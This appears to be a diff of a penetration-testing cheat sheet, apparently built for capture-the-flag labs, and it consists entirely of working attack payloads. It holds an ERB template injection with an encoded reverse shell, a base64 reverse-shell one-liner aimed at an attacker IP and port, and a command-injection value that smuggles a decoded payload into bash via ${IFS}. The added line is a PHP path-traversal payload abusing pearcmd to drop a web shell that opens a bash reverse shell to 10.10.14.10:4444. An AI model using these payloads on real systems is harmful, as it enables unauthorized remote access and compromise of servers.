@@ -4,3 +4,5 @@ category1=a%0A<%25%3dsystem("echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xMjcv
 
 echo '/bin/sh -i >& /dev/tcp/$KaliIP/$Port 0>&1' | base64
 username=user;echo${IFS}'Yourencodedpayload'|base64${IFS}-d|bash;
+
+http://itrc.ssg.htb/?page=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMTAvNDQ0NCAwPiYxJw=="));?>+/tmp/hello.php
